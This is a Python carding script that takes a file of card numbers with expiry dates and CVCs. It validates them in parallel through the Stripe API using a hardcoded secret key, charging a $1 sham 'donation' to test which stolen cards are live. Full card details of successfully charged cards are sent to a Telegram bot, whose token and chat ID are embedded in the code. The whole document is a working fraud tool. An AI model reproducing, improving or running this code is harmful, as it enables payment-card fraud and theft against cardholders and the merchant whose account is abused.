import re
import os
import urllib3
import os.path
import requests
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class colors:
  LGREEN = '\033[38;2;129;199;116m'
  LRED = '\033[38;2;239;83;80m'
  RESET = '\u001B[0m'
  LXC = '\033[38;2;255;152;0m'
  GREY = '\033[38;2;158;158;158m'


class checker:

  def check(self, cc):
    sk = "OWqOEhNXsGpfkxiTmYXysH83ECRnSt7Z0OkRxYGo9mcM8Cwe1U6lsFqpC8Oo4Myy900ZJ49CFmN"
    amt = 1
    chatid = "6297075167"
    proto = cc.split("|")
    try:
      r = requests.post(
        "https://api.stripe.com/v1/payment_methods",
        headers={"Authorization": f"Bearer {sk}"},
        data=
        f"type=card&card[number]={proto[0]}&card[exp_month]={proto[1]}&card[exp_year]={proto[2]}&card[cvc]={proto[3]}"
      )
      auth1 = r.text
      id = re.search('"id": "(.*)"', auth1)
      if id:
        try:
          r2 = requests.post(
            "https://api.stripe.com/v1/payment_intents",
            headers={"Authorization": f"Bearer {sk}"},
            data=
            f"amount={100*amt}&currency=usd&payment_method_types[]=card&description=REL8 Donation&payment_method={id.group(1)}&confirm=true&off_session=true"
          )
          auth2 = r2.text
          if 'Payment complete' in auth2:
            type = "CCN"
            if '"cvc_check": "pass"' in auth2:
              type = "CVV"
            print(
              f"{colors.GREY}=> {colors.RESET}{cc}|{colors.LGREEN}{amt}$ {type} CHARGED{colors.RESET}"
            )
            premsg = urllib.parse.quote_plus(
              f"<b>CC => <code>{cc}</code>\nRESPONSE => ${amt} {type} CHARGED</b>"
            )
            requests.get(
              f"https://api.telegram.org/bot6970943600:AAEwEyhGU_Rz6kYjTnlgI9KssYFhKAKEMw0-AEHQ/sendMessage?chat_id={chatid}&text={premsg}&parse_mode=HTML"
            )
          elif '"cvc_check": "pass"' in auth2:
            print(
              f"{colors.GREY}=> {colors.RESET}{cc}|{colors.LGREEN}CVV_LIVE{colors.RESET}"
            )
          elif "insufficient_funds" in auth2:
            print(
              f"{colors.GREY}=> {colors.RESET}{cc}|{colors.LGREEN}INSUFFICIENT_FUNDS{colors.RESET}"
            )
          elif "security code is incorrect" in auth2:
            print(
              f"{colors.GREY}=> {colors.RESET}{cc}|{colors.LGREEN}INCORRECT_CVC{colors.RESET}"
            )
          elif "authentication_required" in auth2:
            print(
              f"{colors.GREY}=> {colors.RESET}{cc}|{colors.LGREEN}32DS_REQUIRED{colors.RESET}"
            )
          elif "Invalid API Key provided" in auth2:
            print(
              f"{colors.GREY}=> {colors.RESET}{cc}|{colors.LRED}INVALID_API_KEY{colors.RESET}"
            )
          elif "You did not provide an API key" in auth2:
            print(
              f"{colors.GREY}=> {colors.RESET}{cc}|{colors.LRED}NO_API_KEY_PROVIDED{colors.RESET}"
            )
          elif "decline_code" in auth2:
            reason = re.search('"decline_code": "(.*)"',
                               auth2).group(1).upper()
            print(
              f"{colors.GREY}=> {colors.RESET}{cc}|{colors.LRED}{reason}{colors.RESET}"
            )
          elif '"code": "' in auth2:
            reason = re.search('"code": "(.*)"', auth2).group(1).upper()
            print(
              f"{colors.GREY}=> {colors.RESET}{cc}|{colors.LRED}{reason}{colors.RESET}"
            )
          else:
            print(auth2)
            reason = "UNKNOWN"
            print(
              f"{colors.GREY}=> {colors.RESET}{cc}|{colors.LRED}{reason}{colors.RESET}"
            )
        except Exception as e:
          print(e)
      else:
        if '"cvc_check": "pass"' in auth1:
          print(
            f"{colors.GREY}=> {colors.RESET}{cc}|{colors.LGREEN}CVV_LIVE{colors.RESET}"
          )
        elif "security code is incorrect" in auth1:
          print(
            f"{colors.GREY}=> {colors.RESET}{cc}|{colors.LGREEN}INCORRECT_CVC{colors.RESET}"
          )
        elif "authentication_required" in auth1:
          print(
            f"{colors.GREY}=> {colors.RESET}{cc}|{colors.LGREEN}32DS_REQUIRED{colors.RESET}"
          )
        elif "Invalid API Key provided" in auth1:
          print(
            f"{colors.GREY}=> {colors.RESET}{cc}|{colors.LRED}INVALID_API_KEY{colors.RESET}"
          )
        elif "You did not provide an API key" in auth1:
          print(
            f"{colors.GREY}=> {colors.RESET}{cc}|{colors.LRED}NO_API_KEY_PROVIDED{colors.RESET}"
          )
        elif "decline_code" in auth1:
          reason = re.search('"decline_code": "(.*)"', auth1).group(1).upper()
          print(
            f"{colors.GREY}=> {colors.RESET}{cc}|{colors.LRED}{reason}{colors.RESET}"
          )
        elif '"code": "' in auth1:
          reason = re.search('"code": "(.*)"', auth1).group(1).upper()
          print(
            f"{colors.GREY}=> {colors.RESET}{cc}|{colors.LRED}{reason}{colors.RESET}"
          )
        else:
          reason = "UNKNOWN"
          print(
            f"{colors.GREY}=> {colors.RESET}{cc}|{colors.LRED}{reason}{colors.RESET}"
          )
    except Exception as e:
      print(e)


if __name__ == '__main__':
  threads = []
  while (True):
    try:
      thrd = int(input("[THREAD] : "))
      break
    except:
      pass
  while (True):
    try:
      cclist = input("[CC PATH] : ")
      with open(cclist) as prelista:
        lista = prelista.read().splitlines()
      break
    except:
      pass
  with ThreadPoolExecutor(max_workers=thrd) as executor:
    for cc in lista:
      threads.append(executor.submit(checker().check, cc))
  quit()